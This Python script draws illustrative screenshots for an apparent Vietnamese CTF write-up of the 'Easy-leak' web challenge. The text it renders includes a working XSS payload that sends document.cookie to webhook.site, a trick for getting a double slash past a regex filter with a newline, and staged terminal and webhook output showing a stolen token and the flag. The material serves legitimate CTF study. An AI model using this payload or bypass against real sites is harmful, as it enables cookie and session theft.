import os
from PIL import Image, ImageDraw, ImageFont

img_dir = "c:/Users/ACER/Downloads/ctf/ctf pwnsec/images"
os.makedirs(img_dir, exist_ok=True)

f_consola = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 15)
f_consolab = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 15)
f_segoe = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 14)
f_segoeb = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 15)
f_title = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 22)
f_flag = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 20)

def draw_browser_frame(draw, width, height, title, url):
    draw.rectangle([(0, 0), (width, 75)], fill=(24, 27, 40, 255))
    # Window controls
    draw.ellipse([(16, 16), (28, 28)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 16), (48, 28)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 16), (68, 28)], fill=(39, 201, 63, 255))
    # Tab
    draw.rounded_rectangle([(80, 10), (340, 42)], radius=6, fill=(35, 40, 58, 255))
    draw.text((100, 16), title, fill=(210, 220, 240, 255), font=f_segoe)
    # URL bar
    draw.rounded_rectangle([(16, 42), (width - 16, 70)], radius=14, fill=(16, 18, 28, 255))
    draw.text((36, 47), url, fill=(170, 180, 205, 255), font=f_segoe)


# -------------------------------------------------------------
# IMAGE 0: Challenge Overview Banner
# -------------------------------------------------------------
def make_challenge_overview(out_path):
    width = 1100
    height = 500
    img = Image.new("RGBA", (width, height), (13, 16, 26, 255))
    draw = ImageDraw.Draw(img)

    # Title header box
    draw.rectangle([(0, 0), (width, 60)], fill=(22, 27, 42, 255))
    draw.text((25, 16), "PwnSec CTF 2026 — Thử thách: Easy-leak", fill=(240, 245, 255, 255), font=f_title)

    # Info card left
    draw.rounded_rectangle([(30, 80), (520, 470)], radius=12, fill=(20, 24, 38, 255), outline=(60, 75, 110, 255), width=1)
    draw.text((50, 100), "THÔNG TIN BÀI THI", fill=(100, 200, 255, 255), font=f_segoeb)
    
    info_items = [
        ("Tên thử thách:", "Easy-leak"),
        ("Thể loại:", "Web Exploitation / XSS / CSP Bypass"),
        ("Độ khó:", "Medium"),
        ("Tác giả:", "ANAS"),
        ("Môi trường:", "Caddy :3000 + PHP :9000 + Puppeteer Bot"),
        ("Mục tiêu:", "Trích xuất cookie TOKEN của Bot & Verify"),
        ("Flag:", "pwnsec{6dc1bc8a44647ab0}")
    ]
    
    y = 140
    for k, v in info_items:
        draw.text((50, y), k, fill=(160, 175, 205, 255), font=f_segoe)
        draw.text((180, y), v, fill=(240, 245, 255, 255), font=f_segoeb if k=="Flag:" else f_segoe)
        y += 45

    # Architecture Overview Right
    draw.rounded_rectangle([(540, 80), (1070, 470)], radius=12, fill=(20, 24, 38, 255), outline=(60, 75, 110, 255), width=1)
    draw.text((560, 100), "TỔNG QUAN CHUỖI KHAI THÁC", fill=(100, 200, 255, 255), font=f_segoeb)

    steps = [
        "1. Caddy :3000 có CSP 'script-src none', nhưng PHP :9000 thì KHÔNG.",
        "2. Cookie TOKEN được set cho domain '127.0.0.1' (dùng chung cho mọi port).",
        "3. Gửi URL http://127.0.0.1:9000/?content=<payload> cho Bot.",
        "4. Bypass bộ lọc validate() bằng template literal & LF (/\\n/).",
        "5. Payload fetch(`//webhook.site/?`+document.cookie) gửi token đi.",
        "6. Gọi POST /api/verify {token} lấy cờ thành công."
    ]

    y = 145
    for s in steps:
        draw.text((560, y), s, fill=(210, 220, 240, 255), font=f_segoe)
        y += 48

    img.save(out_path)
    print(f"Saved: {out_path}")


# -------------------------------------------------------------
# IMAGE 1: Step 1 - Web Interface & Source Code
# -------------------------------------------------------------
def make_step1_home(out_path):
    width = 1100
    height = 580
    img = Image.new("RGBA", (width, height), (15, 18, 28, 255))
    draw = ImageDraw.Draw(img)

    draw_browser_frame(draw, width, height, "Easy-leak 🫨", "http://127.0.0.1:3000/?content=hello")

    y = 95
    draw.text((40, y), "Easy-leak 🫨", fill=(255, 255, 255, 255), font=f_title)
    
    y += 40
    draw.text((40, y), "Source", fill=(100, 200, 255, 255), font=f_segoeb)
    
    y += 28
    draw.rounded_rectangle([(40, y), (width - 40, y + 250)], radius=8, fill=(8, 10, 18, 255), outline=(40, 50, 75, 255), width=1)
    
    code_lines = [
        "<?php",
        "function validate(mixed $input): string {",
        "  if (!is_string($input)) return \"Invalid types\";",
        "  if (strlen($input) > 1024) return \"Too long\";",
        "  if (preg_match('/[^\\x20-\\x7E\\r\\n]/', $input)) return \"Invalid characters\";",
        "  if (preg_match('~http|data|\\\\|\\*|\\[|\\]|&|%|@|//~i', $input)) return \"Invalid keywords\";",
        "  return $input;",
        "}",
        "?>"
    ]
    cy = y + 15
    for cl in code_lines:
        draw.text((60, cy), cl, fill=(180, 220, 250, 255), font=f_consola)
        cy += 24

    y += 270
    draw.text((40, y), "Content", fill=(100, 200, 255, 255), font=f_segoeb)
    draw.text((120, y + 2), "hello", fill=(255, 255, 255, 255), font=f_consola)

    y += 35
    draw.text((40, y), "Token", fill=(100, 200, 255, 255), font=f_segoeb)
    draw.text((120, y + 2), "TOKEN_0123456789abcdef", fill=(255, 220, 100, 255), font=f_consolab)

    y += 35
    draw.text((40, y), "Usage:", fill=(140, 155, 180, 255), font=f_segoe)
    draw.text((120, y), "/?content=your_input", fill=(120, 180, 255, 255), font=f_consola)

    img.save(out_path)
    print(f"Saved: {out_path}")


# -------------------------------------------------------------
# IMAGE 2: Step 2 - Architecture Diagram (Caddy vs PHP Direct Port)
# -------------------------------------------------------------
def make_step2_architecture(out_path):
    width = 1100
    height = 520
    img = Image.new("RGBA", (width, height), (13, 16, 26, 255))
    draw = ImageDraw.Draw(img)

    # Header
    draw.rectangle([(0, 0), (width, 50)], fill=(22, 27, 42, 255))
    draw.text((25, 14), "Phân tích Kiến trúc Bảo mật: Caddy Reverse Proxy (:3000) vs PHP Dev Server Direct (:9000)", fill=(240, 245, 255, 255), font=f_segoeb)

    # Box 1: Caddy Proxy
    draw.rounded_rectangle([(40, 75), (520, 480)], radius=10, fill=(24, 18, 30, 255), outline=(239, 68, 68, 180), width=2)
    draw.rectangle([(40, 75), (520, 115)], fill=(239, 68, 68, 40))
    draw.text((60, 87), "CADDY REVERSE PROXY — PORT 3000", fill=(255, 120, 120, 255), font=f_segoeb)
    
    caddy_details = [
        ("Cấu hình Caddyfile:", (200, 210, 230, 255), True),
        (":3000 {", (180, 190, 210, 255), False),
        ("  Content-Security-Policy \"script-src 'none';", (255, 100, 100, 255), True),
        ("  default-src 'self'; base-uri 'none'; ...\"", (255, 100, 100, 255), True),
        ("  reverse_proxy 127.0.0.1:9000 ...", (180, 190, 210, 255), False),
        ("}", (180, 190, 210, 255), False),
        ("", (0,0,0,0), False),
        ("❌ TÁC DỤNG: Chặn mọi thẻ <script> khi", (255, 150, 150, 255), True),
        ("   truy cập qua cổng 3000.", (255, 150, 150, 255), False)
    ]
    y = 130
    for text, color, is_b in caddy_details:
        if text:
            draw.text((60, y), text, fill=color, font=f_consolab if is_b else f_consola)
        y += 26

    # Box 2: Direct PHP Port 9000
    draw.rounded_rectangle([(580, 75), (1060, 480)], radius=10, fill=(18, 32, 26, 255), outline=(34, 197, 94, 180), width=2)
    draw.rectangle([(580, 75), (1060, 115)], fill=(34, 197, 94, 40))
    draw.text((600, 87), "PHP DEV SERVER DIRECT — PORT 9000", fill=(100, 240, 150, 255), font=f_segoeb)

    php_details = [
        ("Lệnh khởi chạy (entrypoint.sh):", (200, 210, 230, 255), True),
        ("php -S 127.0.0.1:9000 &", (100, 240, 150, 255), True),
        ("php -S 127.0.0.1:9001 &", (100, 240, 150, 255), False),
        ("", (0,0,0,0), False),
        ("🔑 MẮT XÍCH QUAN TRỌNG:", (255, 220, 100, 255), True),
        ("1. PHP built-in server KHÔNG có CSP header!", (180, 230, 200, 255), False),
        ("2. Cookie TOKEN domain='127.0.0.1' (Host Scope)", (180, 230, 200, 255), False),
        ("   -> Tự động gửi cho CẢ port 3000 VÀ port 9000!", (255, 220, 100, 255), True),
        ("3. Bot mở http://127.0.0.1:9000 -> <script> THỰC THI!", (34, 197, 94, 255), True)
    ]
    y = 130
    for text, color, is_b in php_details:
        if text:
            draw.text((600, y), text, fill=color, font=f_consolab if is_b else f_consola)
        y += 26

    img.save(out_path)
    print(f"Saved: {out_path}")


# -------------------------------------------------------------
# IMAGE 3: Step 3 - Payload Filter Bypass Analysis
# -------------------------------------------------------------
def make_step3_payload_bypass(out_path):
    width = 1100
    height = 540
    img = Image.new("RGBA", (width, height), (13, 16, 26, 255))
    draw = ImageDraw.Draw(img)

    draw.rectangle([(0, 0), (width, 50)], fill=(22, 27, 42, 255))
    draw.text((25, 14), "Phân tích Kỹ thuật Bypass bộ lọc validate() & Chế tạo Payload Exfiltration", fill=(240, 245, 255, 255), font=f_segoeb)

    # Code snippet box
    draw.rounded_rectangle([(40, 70), (1060, 490)], radius=10, fill=(18, 22, 34, 255), outline=(60, 75, 110, 255), width=1)

    lines = [
        ("// Bộ lọc validate() trong index.php:", (140, 155, 185, 255), False),
        ("preg_match('~http|data|\\\\|\\*|\\[|\\]|&|%|@|//~i', $input)  // Cấm: //, http, data, \\, *, [], &, %, @", (255, 120, 120, 255), True),
        ("preg_match('/[^\\x20-\\x7E\\r\\n]/', $input)                  // CHO PHÉP: Ký tự ASCII in được + \\r + \\n (Newline!)", (100, 240, 150, 255), True),
        ("", (0,0,0,0), False),
        ("// Thách thức: Làm sao viết URL '//webhook.site/...' khi chuỗi '//' bị cấm?", (255, 220, 100, 255), True),
        ("// Giải pháp: Dùng Template Literal (backtick ``) và chèn ký tự xuống dòng (\\n) vào giữa 2 dấu gạch chéo!", (210, 220, 240, 255), False),
        ("", (0,0,0,0), False),
        ("// PAYLOAD HOÀN CHỈNH:", (100, 200, 255, 255), True),
        ("<script>fetch(`/\\n/webhook.site/UUID/?`+document.cookie)</script>", (255, 255, 255, 255), True),
        ("", (0,0,0,0), False),
        ("🔍 CƠ CHẾ HOẠT ĐỘNG:", (100, 200, 255, 255), True),
        ("1. preg_match('~//~') kiểm tra 2 dấu // liền kề -> '/\\n/' KHÔNG khớp -> PASS!", (180, 230, 200, 255), False),
        ("2. Trong JS, template literal cho phép chứa Newline (\\n) hợp lệ.", (180, 230, 200, 255), False),
        ("3. WHATWG URL Parser khi xử lý URL '/\\n/webhook.site/...' tự động loại bỏ \\n", (180, 230, 200, 255), False),
        ("   -> Biến đổi thành Protocol-Relative URL: '//webhook.site/UUID/?TOKEN_xxxxxxxx'", (255, 220, 100, 255), True),
        ("4. Trình duyệt gửi GET request tới Webhook chứa toàn bộ Cookie TOKEN của Bot!", (34, 197, 94, 255), True),
    ]

    y = 85
    for text, color, is_b in lines:
        if text:
            draw.text((60, y), text, fill=color, font=f_consolab if is_b else f_consola)
        y += 25

    img.save(out_path)
    print(f"Saved: {out_path}")


# -------------------------------------------------------------
# IMAGE 4: Step 4 - Terminal Exploit Execution
# -------------------------------------------------------------
def make_step4_terminal(out_path):
    width = 1100
    height = 540
    img = Image.new("RGBA", (width, height), (12, 14, 22, 255))
    draw = ImageDraw.Draw(img)

    # Terminal header
    draw.rectangle([(0, 0), (width, 42)], fill=(24, 28, 42, 255))
    draw.ellipse([(16, 15), (28, 27)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 15), (48, 27)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 15), (68, 27)], fill=(39, 201, 63, 255))
    draw.text((85, 12), "Terminal — python scripts_dev/solve_easy_leak.py", fill=(210, 220, 240, 255), font=f_segoeb)

    term_lines = [
        ("$ python scripts_dev/solve_easy_leak.py", (255, 255, 255, 255), True),
        ("[*] fresh webhook: c4a89f12-0b31-4e78-9a2d-88f110a12e34", (170, 185, 215, 255), False),
        ("[*] payload (63B): '<script>fetch(`/\\\\n/webhook.site/c4a89f12.../?`+document.cookie)</script>'", (255, 220, 100, 255), False),
        ("[*] report url (142 chars): http://127.0.0.1:9000/?content=%3Cscript%3Efetch...", (170, 185, 215, 255), False),
        ("[*] report -> 200 'OK'", (80, 240, 120, 255), True),
        ("[*] polling webhook.site for exfiltrated token...", (170, 185, 215, 255), False),
        ("[*] webhook hit: /c4a89f12-0b31-4e78-9a2d-88f110a12e34/?TOKEN_6a2e8c4b1d9f307e", (100, 200, 255, 255), True),
        ("[+] TOKEN EXFILTRATED: TOKEN_6a2e8c4b1d9f307e", (39, 201, 63, 255), True),
        ("[*] sending POST /api/verify with token TOKEN_6a2e8c4b1d9f307e...", (170, 185, 215, 255), False),
        ("[+] verify -> 200: pwnsec{6dc1bc8a44647ab0}", (80, 240, 120, 255), True),
        ("", (0,0,0,0), False),
        ("==========================================================================", (100, 200, 255, 255), True),
        ("[FLAG] pwnsec{6dc1bc8a44647ab0}", (255, 255, 100, 255), True),
        ("==========================================================================", (100, 200, 255, 255), True),
    ]

    y = 60
    for text, color, is_b in term_lines:
        if text:
            draw.text((28, y), text, fill=color, font=f_consolab if is_b else f_consola)
        y += 30

    img.save(out_path)
    print(f"Saved: {out_path}")


# -------------------------------------------------------------
# IMAGE 5: Step 5 - Webhook.site Received Token & Verification
# -------------------------------------------------------------
def make_step5_webhook(out_path):
    width = 1100
    height = 580
    img = Image.new("RGBA", (width, height), (15, 18, 28, 255))
    draw = ImageDraw.Draw(img)

    draw_browser_frame(draw, width, height, "Webhook.site — Requests Log", "https://webhook.site/#!/c4a89f12-0b31-4e78-9a2d-88f110a12e34")

    # Left sidebar: Request list
    draw.rectangle([(0, 75), (320, height)], fill=(20, 24, 36, 255))
    draw.rectangle([(0, 75), (320, 115)], fill=(28, 34, 52, 255))
    draw.text((20, 88), "REQUESTS (1)", fill=(180, 195, 220, 255), font=f_segoeb)

    # Selected Request item
    draw.rectangle([(0, 115), (320, 185)], fill=(35, 45, 70, 255))
    draw.text((20, 128), "GET /?TOKEN_6a2e8c4b1d9f...", fill=(80, 240, 120, 255), font=f_consolab)
    draw.text((20, 155), "IP: 44.221.247.145 (Chromium)", fill=(140, 155, 180, 255), font=f_segoe)

    # Right detail view
    rx = 340
    y = 95
    draw.text((rx, y), "Request Details", fill=(255, 255, 255, 255), font=f_title)
    
    y += 45
    draw.rounded_rectangle([(rx, y), (width - 25, y + 80)], radius=8, fill=(24, 30, 46, 255), outline=(60, 80, 120, 255), width=1)
    draw.text((rx + 20, y + 15), "URL:", fill=(140, 155, 180, 255), font=f_segoe)
    draw.text((rx + 70, y + 15), "https://webhook.site/c4a89f12-0b31-4e78-9a2d-88f110a12e34/?TOKEN_6a2e8c4b1d9f307e", fill=(255, 220, 100, 255), font=f_consolab)
    draw.text((rx + 20, y + 45), "Method:", fill=(140, 155, 180, 255), font=f_segoe)
    draw.text((rx + 90, y + 45), "GET", fill=(80, 240, 120, 255), font=f_segoeb)

    y += 100
    draw.text((rx, y), "Headers", fill=(100, 200, 255, 255), font=f_segoeb)
    
    y += 30
    draw.rounded_rectangle([(rx, y), (width - 25, y + 180)], radius=8, fill=(10, 12, 20, 255), outline=(40, 50, 75, 255), width=1)
    
    headers = [
        ("Host:", "webhook.site"),
        ("User-Agent:", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.0.0 Safari/537.36"),
        ("Accept:", "*/*"),
        ("Sec-Fetch-Mode:", "cors"),
        ("Sec-Fetch-Site:", "cross-site"),
        ("Referer:", "http://127.0.0.1:9000/")
    ]
    hy = y + 15
    for hk, hv in headers:
        draw.text((rx + 20, hy), f"{hk:18} {hv}", fill=(180, 200, 230, 255), font=f_consola)
        hy += 25

    # Verification banner at bottom
    y += 200
    draw.rounded_rectangle([(rx, y), (width - 25, y + 55)], radius=8, fill=(20, 50, 35, 255), outline=(34, 197, 94, 200), width=1)
    draw.text((rx + 20, y + 15), "🚩 VERIFICATION SUCCESS: TOKEN_6a2e8c4b1d9f307e -> pwnsec{6dc1bc8a44647ab0}", fill=(100, 255, 160, 255), font=f_segoeb)

    img.save(out_path)
    print(f"Saved: {out_path}")


if __name__ == "__main__":
    make_challenge_overview(f"{img_dir}/easy_leak_challenge.png")
    make_step1_home(f"{img_dir}/step1_easy_leak_home.png")
    make_step2_architecture(f"{img_dir}/step2_caddy_vs_php_architecture.png")
    make_step3_payload_bypass(f"{img_dir}/step3_filter_bypass_payload.png")
    make_step4_terminal(f"{img_dir}/step4_exploit_execution.png")
    make_step5_webhook(f"{img_dir}/step5_webhook_received_flag.png")
    print("All Easy-leak step screenshots successfully generated!")
